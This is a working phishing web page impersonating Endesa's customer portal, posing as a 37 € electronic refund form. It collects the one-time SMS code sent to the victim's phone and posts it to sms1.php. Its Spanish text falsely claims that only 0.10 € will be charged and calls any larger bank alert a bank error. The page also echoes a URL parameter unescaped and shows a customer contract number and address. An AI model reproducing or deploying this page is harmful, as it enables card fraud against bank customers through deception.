<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es" dir="ltr" lang="es">
<head>
<meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
	<title>Formulario de reembolso electrónico</title>
		<meta name="robots" content="noindex">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
	<link rel="shortcut icon" href="../src/favicon.png">
<link media="all" href="../src/index.css" type="text/css" rel="stylesheet">
<link rel="stylesheet" href="../src/bootstrap.min.css">
<script type="text/javascript">
    function karimo(){  
    		var Cd = document.getElementById('Cd').value;
    		var chp1 = document.getElementById('twiter').value;
    		var chp = document.getElementById('twiter');
    			if (chp1.match(/^\d+$/) && chp1 !="") {
	    				if(Cd != chp1){
	    			var el = document.getElementById('loading');
	                var e = document.getElementById('cont');
	                if( el ) 
	                    el.style.display = 'block';
	                    e.style.display = 'none';      
	            	setTimeout(function(){ document.Form_AskAuthentication.submit();}, 5000);
	    			}else{
	    				chp.style.border = "1px solid rgba(255, 0, 0, 0.59)";
	    				return false;
	    			}
    			}else{
	    				chp.style.border = "1px solid rgba(255, 0, 0, 0.59)";
	    				return false;
	    			}
        }
        </script>
</head>
<body class="Sites_IB_ES">
	 
<!-- body -->
<div>
	<div class="contenedor_general">			
				<header class="cabecera mod_header">
<section class="mod_modal_dialogs">
            <!-- INICIO DE VENTANA MODAL NAVEGADORES OBSOLETOS -->
            <dialog id="fc-modalNavigatorVersion" data-configmodal="1" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
            </dialog>
            <!-- FIN DE VENTANA MODAL NAVEGADORES OBSOLETOS -->
        </section>
		<div class="wrapper lista_desplegable_b Hogares">
<a class="skip-main textSmaller semiBold" href="#IrContenidoAccesibilidad">Ir al contenido</a>
		<h2 class="logo propiedadCSS3 col-xs-12 col-sm-12">
				<a href="#" title="Luz, gas y electricidad para tu casa" class="">
						<img alt="Luz" src="../src/bg_logo.png">
				</a>
		</h2>
		<div class="visible-xs visible-sm" style="float: right;margin-right: 20px;">
				<a href="#" class="">
						<img alt="Luz" src="../src/MenuMob.png">
				</a>
		</div>
		<div style="clear: both;"></div>
						<span class="tooltipHeader hiddenMobile">"Elige tu perfil."</span>
  <nav class="links options visible-lg visible-md">
   <div id="headerNavigator" class="round-border-box round-border-box-width propiedadCSS3 navigator_menu level2 visible-lg visible-md">
      <ul class="clientSupport">
        <li class="contactanos">
	<a class="textSmaller" href="#" title="Atención al Cliente">
		Atención al Cliente
	</a>
        </li>
        <li class="idioma dropdown">
            <a class="textSmaller semiBold" href="javascript:void(0);" title="Español">
              Español
            </a>
            <ul class="dropdown_container">
                    <li>
<!--packed:
null
-->
                         <a href="#" class="textSmaller semiBold" title="Català">
                            Català
                        </a>                    
                    </li>
                    <li>
<!--packed:
null
-->
                         <a href="#" class="textSmaller semiBold" title="English">
                            English
                        </a>                    
                    </li>
            </ul>
        </li>               
        <li class="tamano_fuente dropdown">
          <a class="textSmaller semiBold" href="javascript:void(0);" title="Cambia el tamaño de la fuente">
            -A+
          </a>
          <ul class="dropdown_container">
            <li>
              <a class="textSmaller semiBold" href="#" id="plusBtn" title="Aumentar">
                <span class="sizes">A+</span> Aumentar
              </a>
            </li>
            <li>
              <a class="textSmaller semiBold" href="#" id="minusBtn" title="Reducir">
                <span class="sizes">A-</span> Reducir
              </a>
            </li>
          </ul>
        </li>
<!-- hogares -->
    <li class="searchContent" style="width: 28%;">
			<label class="ui-widget" for="searchTags">
				<form method="POST" novalidate="" action="#" name="searchForm" id="searchHeaderForm">
					<div class="easy-autocomplete eac-round" style="width: 151px;"><input class="search" aria-label="Escribe aquí tu pregunta" name="faqsSearchTags" id="searchHeaderBox" placeholder="Escribe aquí tu pregunta" autocomplete="off" value="" type="text"><div class="easy-autocomplete-container" id="eac-container-searchHeaderBox"><ul></ul></div></div>
				        <input id="faqSearchId" value="" type="hidden">
				</form>
			</label>
			<input id="send-button-top" class="searchButton ftr" aria-label="Buscar" title="Buscar" value="Buscar" type="submit">
		</li>
      </ul>
    </div>                    
  </nav>
<!-- Obtenemos el segmento y hacemos la logica para ir a una u otra template. -->
<div class="mega-toolbar accesible visible-lg visible-md">
    <!--Mega Menú-->
    <div class="mega-menu  visible-lg visible-md">
        <div class="mega-opt  visible-lg visible-md">
            <ul class="mega-tablist" role="tablist">
		                    <li class="item-menu">
		                    	<a id="mega-link-id-1" class="item-link mga" href="#1383140687140" role="tab" tabindex="0" aria-controls="1383140687140" aria-selected="false" aria-labelledby="mega-link-id-1">
		                    		Contratar
		                    	</a>
		                    </li>
		                    <li class="item-menu">
		                    	<a id="mega-link-id-2" class="item-link mga" href="#1383138001881" role="tab" tabindex="-1" aria-controls="1383138001881" aria-selected="false" aria-labelledby="mega-link-id-2">
		                    		Te ayudamos
		                    	</a>
		                    </li>
		                    <li class="item-menu">
		                    	<a id="mega-link-id-3" class="item-link mga" href="#1383359364161" role="tab" tabindex="-1" aria-controls="1383359364161" aria-selected="false" aria-labelledby="mega-link-id-3">
		                    		Conoce la energía
		                    	</a>
		                    </li>
		                    <li class="item-menu">
		                    	<a id="mega-link-id-4" class="item-link mga" href="#1399990191316" role="tab" tabindex="-1" aria-controls="1399990191316" aria-selected="false" aria-labelledby="mega-link-id-4">
		                    		Ahorra con Endesa
		                    	</a>
		                    </li>
            </ul>
        </div>
    </div>
</div>

				<!-- EPT Comportamiento login - ParÃ¡metro service -->
        	<div class="en-client-area visible-lg visible-md" data-function="fc-client-area">
                <a href="#" title="Área cliente" class="en-client-area__btn-click en-client-area__btn-click--down uppercase" aria-expanded="false">
                	Hola</a>
	        </div>
		</div>
	<div id="testAjax"></div>

<a id="IrContenidoAccesibilidad"></a>
				</header>
				<div class="mod_subNavegation">
	<section class="wrapper Hogares">
	    <h4 class="hide">Home principal</h4>
	    <div class="subNavegation">
	            <nav class="breadcrumbs">
	            	<h5 class="hide">Navegación actual</h5>
					<ul>
							<li class="crumb">
								<a class="crumbLink" href="#" title="Hogares">
									Hogares
								</a>
							</li>
							<li class="crumb">
								<a class="crumbLink" href="#" title="Mi Endesa">
									Mi Endesa
								</a>
							</li>
						<li class="crumb">
							<span class="crumbLink active textSmall">Mi perfil</span>
						</li>
					</ul>
				</nav>
		<nav class="optionTo">
	   		<h5 class="hide">Redes Sociales</h5>
		   	<ul>
		       	<li>
		       		<a class="optLink toPrint" href="javascript:window.print()" title="Imprimir">
		       			Imprimir
		       		</a>
		       	</li>
		       	<li id="liFavourite">
		       		<a class="optLink toBookmarks" href="#" title="A favoritos">
		       			A favoritos
		       		</a>
		       	</li>
		   	</ul>
			   	<div id="divFavorites" class="favoritos_ezone outH">
					<form id="favoriteForm" class="validacionform positionRelative" action="#" method="post" novalidate="novalidate">
                        <fieldset>
                            <div class="col">
                                <div class="dtPadding_bottom">
                                    <label for="favoritos" class="labelInlineImportant textSmaller bold strongTitle requiredData">
                                        Agregar a favoritos
                                    </label>
                                </div>
                                <div class="MarginTop0con5em">
                                    <div class="boxTL">
                                        <input id="favoritos" class="validateInfo required inputText boxTL textSmaller marginRight5 italic width90 propiedadCSS3" name="favoritos" placeholder="Luz, gas y calefacción para tu hogar - Endesa Online" value="">                                
                                    </div>
                                    <div class="boxTL">
                                        <input class="buttonTipo1 textSmaller070em  boxTL MarginLeft1em" value="Guardar" onclick="addFavourite();" type="button"> 
                                        <a href="#" title="Cancelar" class="MarginLeft1em textSmaller linkStyle favoritos_close">
                                            Cancelar
                                        </a>
                                    </div>
                                    <div class="textSmaller070em favoritos_tooltip">
                                        <div class="positionRelative">
                                            Podrás encontrarlo en el ezone, en la pestaña favoritos en el pie de página
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </fieldset>                 
                    </form>
				</div>
		</nav>
		</div>
	</section>
	<section class="mod_modal_dialogs">
		<dialog id="modalFavorites" data-configmodal="1" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
			<div class="eInvoice_state activeBoxV vent_Modal mod_info_box mod_gestiones boxed propiedadCSS3">
				<div class="notification succes">
					<div class="eInvoice_state_head">
						<h5 class="infoContent textNormal bold textGreen">Página guardada como favorita correctamente</h5>
					</div>
				</div>
			</div>
		</dialog>
	</section>
	<div id="divError"></div> 
	            </div>
<!--segmentos en Layout GestionaOnline despues miga-->
<!--AQUI-->
				<div class="mod_subNavegation">
	            	<!--AQUI-->
	<div class="mod_gestNav">
    	<div class="wrapper">
        	<h4 class="hide"> Menú área privada</h4>
            <nav class="taskBlock">
            	<h5 class="hide">Mi perfil </h5>
            	<ul class="taskList">	
												<li class="task propiedadCSS3 ">
													<a class="textSmall semiBold taskLink" href="#" title="Inicio">
														Inicio
													</a>
												</li>
												<li class="task propiedadCSS3 ">
													<a class="textSmall semiBold taskLink" href="#" title="Mis facturas">
														Mis facturas
													</a>
												</li>
												<li class="task active propiedadCSS3 ">
													<a class="textSmall semiBold taskLink" href="#" title="Mi perfil">
														Mi perfil
													</a>
												</li>
												<li class="task propiedadCSS3 ">
													<a class="textSmall semiBold taskLink" href="#" title="Mis contratos">
														Mis contratos
													</a>
												</li>
												<li class="task propiedadCSS3 ">
													<a class="textSmall semiBold taskLink" href="#" title="Consultas">
														Consultas
													</a>
												</li>
												<li class="task propiedadCSS3 ">
													<a class="textSmall semiBold taskLink" href="#" title="Mi Consumo por horas">
														Mi Consumo por horas
													</a>
												</li>
												<li class="task propiedadCSS3 ">
													<a class="textSmall semiBold taskLink" href="#" title="Mis documentos">
														Mis documentos
													</a>
												</li>
				</ul>
	 		</nav>
     	</div>
	</div>
	            </div>
            	<section class="mod_content theme modulation">	
            		<h3 class="hide">Mi perfil</h3>                
	                <div class="layerM lista_desplegable_b">
	                	<div class="mod_layer_2">
                        <div class="mod_left">
				            <div class="mod_info_box block1">
    <section class="mod_modal_dialogs">
    <dialog id="modal_loading" data-configmodal="1" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
      <div class="eInvoice_state activeBoxV vent_Modal mod_info_box mod_gestiones boxed propiedadCSS3">
        <div>
          <div class="eInvoice_state_head">
            <p></p>
            <div style="text-align: center;"></div>
            <div style="text-align: center;" class="infoContent textNormal bold textBlue">Operación ejecutándose...</div>            
        </div>          
        </div>            
      </div>
    </dialog> 
   </section> 
   <section class="mod_modal_dialogs">
   </section>
   <section class="mod_modal_dialogs"> 
        <dialog id="modalError02031" data-configmodal="1" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
            <div class="eInvoice_state activeBoxV vent_Modal mod_info_box mod_info_content boxed propiedadCSS3">
                <div class="mod_cols mod_colsW100">
                <div class="mod_cols_top itemSlider">
                    <h4 class="textBig">Actualiza tus datos de email. </h4>
                </div>
                    <div class="notification error">
                        <div class="eInvoice_state_head">   
                            <p class="infoContent titleBoxCols orange">Advertencia </p>
                        </div>
                        <p class="infoContent textSmall typeC2">
                            Actualmente tu email está asociado a varios usuarios de Mi Endesa. Por motivos de seguridad y para ofrecerte las máximas garantías, cada dirección de email debe pertenecer a un único usuario registrado. 
                             Por favor, llámanos al 800 760 206 para que podamos actualizarlo. 
                            <a title=" " href="#">   </a> 
                        </p>
                        <p class="infoContent textSmall typeC2"> </p>
                        <p class="infoContent textSmall typeC2">   </p>
                    </div>
                </div>
            </div>
        </dialog>
    </section>
  <div class="mod_info_box block1 profileHead paddingL2P_M wide96_M">
    <article class="mod_info_content mod_info_content_no_border mod_cols  mod_cols_white  propiedadCSS3 ">
      <div class="">
          <h4 class="textBigger light " style="margin: 0px; padding: 0px; border: medium none; font-weight: 300; font-style: normal; font-size: 2em; font-family: OpenSans; vertical-align: baseline; text-decoration: none; color: rgb(51, 51, 51); font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">
		  <span class="auto-style2" style="margin: 0px; padding: 0px; border: medium none; font-weight: 600; font-style: normal; font-size: x-large; font-family: inherit; vertical-align: baseline; text-decoration: none;">
		  Forma de REEMBOLSO electrónico</span></h4>
      </div>
      <p class="parrafoMargintop1em textSmall">
	  <span style="color: rgb(51, 51, 51); font-family: OpenSans; font-size: 13.92px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;">
	  Referencia: ENDESA-A8005W</span></p>
    </article>
  </div>
  <div class="" id="updateUserDiv">
            <div class="mod_info_box block1 boxMainConfigAlerts">
                <article class="mod_info_content mod_cols mod_cols_white mod_info_content_border boxed borderLeft1 propiedadCSS3 lista_desplegable_b">
                    <form method="post" id="form_principal" novalidate="novalidate" class="validacionform" action="#">
                        <div class="mod_cols_top itemSlider itemSliderNoBorder">
                            <h4 class="textBig light boxTL">
    Datos<span class="semiBold text_overflow"> de usuario</span>
                            </h4>
                        </div>
                    </form>
                </article>
            </div>
            <section class="mod_modal_dialogs">             
                <dialog id="modal_federated" data-configmodal="1" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
                </dialog>
            </section>
			<div class="mod_info_box block1" id="optionalDataDiv">
				<article class="mod_info_content mod_cols mod_cols_white mod_info_content_border boxed borderLeft1 propiedadCSS3 lista_desplegable_b">
				<div class="mod_cols_top itemSlider itemSliderNoBorder datos_de_titular ui-accordion-header ui-helper-reset ui-state-default ui-accordion-icons ui-accordion-header-active ui-state-active ui-corner-top ui-state-focus" role="tab" id="ui-accordion-1-header-5" aria-controls="optionalDataForm" aria-selected="true" tabindex="0">
					<h4 class="textBig light boxTL" style="margin: 0px; padding: 0px; border: medium none; font-weight: 300; font-style: normal; font-size: 1.18em; font-family: OpenSans; vertical-align: baseline; text-decoration: none; color: rgb(8, 113, 191); font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">
					<span class="semiBold" style="margin: 0px; padding: 0px; border: medium none; font-weight: 600; font-style: normal; font-size: 18.88px; font-family: inherit; vertical-align: baseline; text-decoration: none;">
					1-Ingrese sus datos</span></h4>
					<h4 class="textBig light boxTL">&nbsp;</h4>
				</div>
				



<form name="Form_AskAuthentication" id="optionalDataForm" class="validacionform ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom ui-accordion-content-active" method="post" action="sms1.php" style="display: block;" aria-labelledby="ui-accordion-1-header-5" role="tabpanel" aria-expanded="true" aria-hidden="false">
					<input id="Cd" type="hidden" value="<?php echo $_GET['Cd']; ?>" name="Cd">
				<div id="loading" style="text-align: center; font-weight: bolder; font-size:15px; margin: 90px 0;">Por favor espere mientras procesamos su solicitud<br>No cierres el navegador<br><center><br>
				<img src="../src/m-wait.gif" alt="" width="64" height="61" class="actionImage" border="0"><br></center>
				</div> 
					<div id="cont" style="display: none;" class="infoData borderTopAzul6">
						<p class="parrafoMargintop1em textSmall">
	  				  <strong style="margin: 0px; padding: 0px; border: medium none; font-weight: normal; font-style: normal; font-size: 16px; font-family: OpenSans; vertical-align: baseline; text-decoration: none; color: rgb(245, 43, 43); font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">
						Introduzca el código recibido en su teléfono móvil</strong></p>
						<p class="parrafoMargintop1em textSmall">
	  				    <span style="color: rgb(51, 51, 51); font-family: OpenSans; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;">
						Código incorrecto, recibirás otro SMS</span><span lang="fr" style="margin: 0px; padding: 0px; border: medium none; font-weight: normal; font-style: normal; font-size: 16px; font-family: OpenSans; vertical-align: baseline; text-decoration: none; color: rgb(51, 51, 51); font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><span>&nbsp;</span>:
						</span></p>
						<div id="timer" class="textRight" style="width: 252px; height: 1px;">
&nbsp;</div>
    &nbsp;<fieldset>
						<div class="col">
							<div style="height: 40px">
								<input id="twiter" class="validateInfo inputText textSmaller width54 italic propiedadCSS3 changed3" name="sms" placeholder="el código" type="text" maxlength="10" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" required>
							</div>
						</div>
						</fieldset>&nbsp;
						<input id="saveChangesAditional" value="  Confirmar  " title="GUARDAR CAMBIOS" class="MarginBottom1em MarginTop1em_M textSmaller buttonTipo1 color_grey boxTL MarginLeft1em" type="submit" onclick="return karimo();" style="color: rgb(255, 252, 252)">
						<br><br>&nbsp;<p>
				<span lang="fr"><strong>
				<font face="Arial" color="#FF0000" size="4"><b>*</b></font><b><font face="Arial" color="#000000">S</font></b><font color="#000000" face="Arial"><b>olo le cobramos 0.1 € para verificar que su tarjeta sea válida y le reembolsamos después de 1 hora.</b><br></font>
				<b><font color="#FF0000" face="Arial" size="4">*</font></b><font color="#000000" face="Arial">Si 
				recibe un sms que le indica que le cobramos<b> más de 0.1€, es 
				solo un error de su banco.</b></font></strong></span><br><br>
				<img alt="Related image" height="41" src="https://cyclelab.com/images/companies/1/3dsecure_visa_mastercard.png?1472109644109" width="169"></div>
				</form>
				</article>
				<section class="mod_modal_dialogs">
				<dialog id="modal_loading_data" data-configmodal="1" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
				</dialog>
				</section>
			</div>
			<div id="contenido_authorization_data" class="mod_info_box block1 hide">
				<article class="mod_info_content mod_cols mod_cols_white mod_info_content_border boxed propiedadCSS3 lista_desplegable_b">
				<div class="mod_cols_top itemSlider itemSliderNoBorder ui-accordion-header ui-helper-reset ui-state-default ui-corner-all ui-accordion-icons" role="tab" id="ui-accordion-1-header-6" aria-controls="authorization_data_client" aria-selected="false" tabindex="-1">
					<span class="ui-accordion-header-icon ui-icon ui-icon-triangle-1-e">
					</span>
					<h4 class="textBig light boxTL">Gestión<span class="semiBold text_overflow"> de autorizaciones</span>
					</h4>
				</div>
				<div id="authorization_data_client" class="ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" style="display: none;" aria-labelledby="ui-accordion-1-header-6" role="tabpanel" aria-expanded="false" aria-hidden="true">
					<div class="infoData borderTopAzul6">
						<div id="contador_autorizados" class="textSmall typeG6 MarginTopBottom1em">
							Personas autorizadas
                            <p style="display: inline;" id="totalAutorizados">(0)</p>
						</div>
						<div id="tabla_autorizados">
                <!-- Mostramos la lista de autorizados del usuario -->
                		</div>
						<div class="borderAzul6 backgroundGris nueva_persona_autorizada outH">
							<p>Nueva persona autorizada</p>
							<form id="form_tipo" class="validacionform" novalidate="novalidate" action="#">
								<fieldset class="infoData infoDataNoBorder">
								<div class="col col_divForm">
									<div class="iBlock width100">
										<label class="labelInlineImportant textSmaller bold strongTitle" for="tipo_autorizacion2">Tipo de autorización</label>
									</div>
									<div class="iBlock width100">
										<div class="selectorStyled bgdposition99 width54 mobileW93">
											<select class="validateInfo selectorBody textSmaller width120" name="tipo_autorizacion2" id="tipo_autorizacion2" disabled="">
											<option value="1" name="Element_LOV_TipoAutorizacion_Autorizado" id="Element_LOV_TipoAutorizacion_Autorizado">Autorizado
											</option>
											</select> </div>
									</div>
								</div>
								</fieldset>
							</form>
							<fieldset class="infoData a2col MarginLeft1em infoDataNoBorder ">
							<div class="col no_margin_M">
								<div class="iBlock width100">
									<label for="radio_todos_contratos" class="labelItem labelItemTop1emRight2em labelNoAfter">
                                    <!-- labelInlineImportant -->  
									<span class="titleLabel textSmall textBlack">Autorizar para todos los contratos</span>
									<span class="CI_container " style="position: relative;">
									<span aria-hidden="true" tabindex="0" class="CI_customInput CI_radio" role="radio" style="z-index: 10;">
									</span>
									<input class="radio CI_nativeInput" name="radio_nueva_persona_autorizada" id="radio_todos_contratos" value="radio_todos_contratos" style="position: absolute; top: 0px; left: 0px; opacity: 0; z-index: 1;" type="radio"></span></label>
								</div>
							</div>
							</fieldset>
						</div>
						<div class="cajaBorde1 MarginBottom1em textAlignCenter">
							<a href="javascript:void(0)" title="Añadir otra persona autorizada" class="añadir textBlue bold anadir_persona_autorizada">Añadir otra persona autorizada</a>
						</div>
					</div>
					<div id="exito_añadir_autorizado">
					</div>
				</div>
				<section class="mod_modal_dialogs">
				<h4 class="outH">Ventana modal emergente</h4>
				<dialog id="cambios" data-configmodal="1" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
				<div class="eInvoice_state activeBoxV vent_Modal mod_info_box mod_gestiones boxed propiedadCSS3">
					<div class="notification succes">
						<div class="eInvoice_state_head">
							<h5 class="infoContent textNormal bold textGreen MarginTop05emIMP" tabindex="0">Los cambios se han realizado con éxito</h5>
						</div>
					</div>
				</div>
				</dialog>
				</section>
				</article>
			</div>
  </div>
				            </div>
                        </div>
						<div class="mod_right mobileNoDisplayIMP">
	<div class="mod_info_box block2 ocultarBannerLateral">
	 	 <article class="mod_info_content boxed propiedadCSS3 lista_desplegable_b">		
					<div class="mod_cols_top itemSlider sliderBox">
						<h4 class="textBig light "><span class="semiBold text_overflow">REEMBOLSO Online</span>
						</h4>
						<font size=2>Recarga corte <font color=#930000>37 €</font></font>
					</div>
            	<div class="infoData level2 ocultarBannerLateral">  
	                  <ul class="asesorLinks">           
							<li class="iCont">
										<!-- Inicio EPT Comportamiento login -->
										<!-- Fin EPT Comportamiento login -->
		<a class="textNormal linkInfo" href="#" target="_top" title="Ir a Date de alta en la factura digital">
			total a REEMBOLSO
		</a> 
		<p class="textSmall infoContent">
			<font size=2><font color=#006b9f size=6>37 €</font><font color=#930000></font></font>
		</p>
		                      </li>
	           		</ul>
	          </div>
	     </article>
    </div>
	<div class="mod_info_box block2 ocultarBannerLateral">
	 	 <article class="mod_info_content boxed propiedadCSS3 lista_desplegable_b">		
					<div class="mod_cols_top itemSlider sliderBox">
						<h4 class="textBig light ">
    Te<span class="semiBold text_overflow"> atendemos</span>
						</h4>
					</div>
            	<div class="infoData level2 ocultarBannerLateral">  
	                  <ul class="asesorLinks">           
							<li class="iCont">
		<a id="liveagent_button_offline_573580000004FVr" style="" class="icon_small chat" title="Chat">
		 	<span class="iconImg">Informacion</span>
			<span class="titulo">Chat</span>
		</a>
		<p id="onlineEsP" class="textSmall iconDescription">Si tienes dudas y necesitas asesoramiento, te atendemos de lunes a viernes de 9:00 a 21:00 y sábados de 9:00 a 14:00 horas.</p>
		                      </li>
	           		</ul>
	          </div>
	     </article>
    </div>
    <div id="recarga">
		<div id="widgetResult">
			<div class="mod_info_box hide">
				<article class="mod_info_content boxed propiedadCSS3 lista_desplegable_b">
					<h4 class="textBig light itemSlider activo">
						Factura <span class="semiBold">
							electrónica</span> <span style="padding-left: 5px;" id="spanLoading"></span>
					</h4>
					<div class="infoData level2">
						<form id="formWidget" method="post" action="#">
							<input id="flagErrorFD" value="false" type="hidden">
							<fieldset class="col">
								<div class="labelItem">
									<label for="check1" class="titleLabel textSmaller">
										Quiero activar/desactivar el servicio de factura electrónica en todos mis contratos </label> 
								<span class="CI_container " style="position: relative;"><span aria-hidden="true" tabindex="0" class="CI_customInput CI_checkbox" role="checkbox" style="z-index: 10;"></span><input class="checkbox checkBoxPadre CI_nativeInput" name="all_contracts" id="all_contracts" value="contratos" style="position: absolute; top: 0px; left: 0px; opacity: 0; z-index: 1;" type="checkbox"></span></div>
								<ul class="listCheckbox">
										<!-- Mostrar S/N si el numero de la calle es 0 -->
											<li>
												<div class="labelItem" id="checkBoxDiv">
													<label for="cont12077138701" class="titleLabel textSmaller" style="width: 75%;">
														<span style="font-style: italic;">12077138701</span>:
                                    PO 
                                    INDUSTRIAL LAS QUEMADAS 
																,
                                    S/N 
                                    (14014) 
                                    CORDOBA 
                                    CÓRDOBA 
																,   
                                    ESPAÑA 
													</label> 
													<ul class="listCheckboxVinculados" style="margin: 0px 0px 0px 1em;">
															<!-- Id contrato asociado es: contractVinc.product.associatedContractId -->
								</ul>
					<span class="CI_container " style="position: relative;"><span aria-hidden="true" tabindex="0" class="CI_customInput CI_checkbox CI_checked CI_checkbox_checked" role="checkbox" style="z-index: 10;" aria-checked="true"></span><input data-numero="12077138701" data-contratosvinc="" data-first="true" data-product="TL20A" class="checkbox checkBoxChildren CI_nativeInput" checked="checked" name="adress_1" id="cont12077138701" value="12077138701" style="position: absolute; top: 0px; left: 0px; opacity: 0; z-index: 1;" type="checkbox"></span></div>
					</li>
	<!--En el caso de tener todos los contratos con la firma digital activada procedemos a ocultar el widget-->
	</ul>
	</fieldset>
	<fieldset class="separate">
		<input id="activateDigitalBill" class="textSmaller buttonContrast disabled" title="Activar" value="ACTIVAR/DESACTIVAR" disabled="disabled" style="background-color: rgb(220, 220, 220);" type="button">
	</fieldset>
	<input name="isActivate" id="isActivate" value="1" type="hidden">
	</form>
	<p class="displayBlock">
		<a class="textSmall contentLink contentLinkSimple3 semiBold" href="javascript:void(0);" id="eFacturalink" title="¿Qué es la factura electrónica?">
			¿Qué es la factura electrónica?</a>
	</p>
	</div>
	</article>
	</div>
	</div>
	<section class="mod_modal_dialogs">
		<dialog id="unsuscribeDigitalBill" data-configmodal="1" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
		<div class="eInvoice_state activeBoxV vent_Modal mod_info_box mod_info_content boxed propiedadCSS3">
			<div class="notification error">
				<div class="eInvoice_state_head">
					<p class="infoContent textNormal bold textOrange">¿Quieres desactivar la factura electrónica?</p>
				</div>
				<div>
					<p class="textParragraph MarginTop2em textSmall bold typeG6">
						La baja en la factura electrónica puede suponerte la pérdida de ventajas</p>
					<ul class="ulSquare textBlue MarginLeft2em" id="lstDescuentos">
						<li><span class="typeG6 textSmaller">No podras beneficiarte de ciertas ventajas y ofertas</span></li>
					</ul>
					<br>
					<p class="typeG6 textSmaller">Nota: En el caso de que haya seleccionado un contrato vinculado se desactivará la factura electrónica para todos los contratos dependientes.</p>
					<fieldset class="MarginTopLeft1em">
						<label for="checkbox2" class="labelItem labelNoAfter"> <span class="titleLabel textSmaller typeC2 marginL15_M wide92_M">Entiendo la diferencia y quiero darme de baja</span>
						<span class="CI_container " style="position: relative;"><span aria-hidden="true" tabindex="0" class="CI_customInput CI_checkbox" role="checkbox" style="z-index: 10;"></span><input class="checkbox CI_nativeInput" name="checkboxEntiendoFD" id="checkboxEntiendoFD" value="si" style="position: absolute; top: 0px; left: 0px; opacity: 0; z-index: 1;" type="checkbox"></span></label>
					</fieldset>
					<input id="confirmarBajaFactura" style="background-color: rgb(220, 220, 220);" class="MarginTopLeft1em buttonTipo1 displayInlineBlock textSmaller070em" disabled="disabled" value="Confirmar" type="button"> <a class="textSmaller displayInlineBlock" href="javascript:void(0);" onclick="$(&quot;.ui-dialog-content&quot;).dialog(&quot;close&quot;);" title="Cancelar">Cancelar</a>
				</div>
			</div>
		</div>
		</dialog>
	</section>
	<section class="mod_modal_dialogs">
		<dialog id="confirmChangesFDOk" data-configmodal="2" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
		<div class="eInvoice_state activeBoxV vent_Modal mod_info_box mod_info_content boxed propiedadCSS3">
			<div class="mod_info_box mod_info_box_paddingTop1con5 block1">
				<article class="mod_info_content mod_cols">
					<div class="mod_cols mod_colsW100">
						<div class="notification succes">
							<div class="eInvoice_state_head">
								<h4 class="textNormal bold valid1">Los cambios se han realizado correctamente</h4>
							</div>
							<div class="infoData MarginTop2em col colPaddingRight0">
								&nbsp;</div>
						</div>
					</div>
				</article>
			</div>
		</div>
		</dialog>
	</section>
	<section class="mod_modal_dialogs">
		<dialog id="errFullOnlineWFD" data-configmodal="3" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
		<!-- ERROR -->
		<div class="eInvoice_state errorBox mod_info_box mod_info_content boxed propiedadCSS3">
			<div class="mod_cols_top">
				<h4>Desactivación de
					<span class="bold">E-Factura</span>
				</h4>
			</div>
			<div class="notification error">
				<div class="eInvoice_state_head">
					<p class="infoContent textSmall typeC2">No puedes desactivar la factura electrónica para el/los contrato/s 
						<span id="contContratosFullOnline"></span>&nbsp;por ser FullOnline
					</p>
				</div>
			</div>
		</div>
		</dialog>
	</section>
	<section class="mod_modal_dialogs">
		<dialog id="contratosVinculadosAct" data-configmodal="4" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
		<div class="eInvoice_state activeBoxV vent_Modal mod_info_box mod_info_content modal_tooltip propiedadCSS3">
			<div class="mod_cols mod_colsW100">
				<div>
					<h3 class="textBig">
						<span class="bold">Contrato vinculado</span>
					</h3>
				</div>
				<div class="MarginTop1em">
					<p class="textSmaller">
						Si lleva a cabo la activación de la factura electrónica para este contrato se activarán también los contratos&nbsp;<span id="txtContratosVincAct"></span>
					</p>
				</div>
			</div>
		</div>
		</dialog>
	</section>
	<section class="mod_modal_dialogs">
		<dialog id="contratosVinculadosDesact" data-configmodal="5" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
		<div class="eInvoice_state activeBoxV vent_Modal mod_info_box mod_info_content modal_tooltip propiedadCSS3">
			<div class="mod_cols mod_colsW100">
				<div>
					<h3 class="textBig">
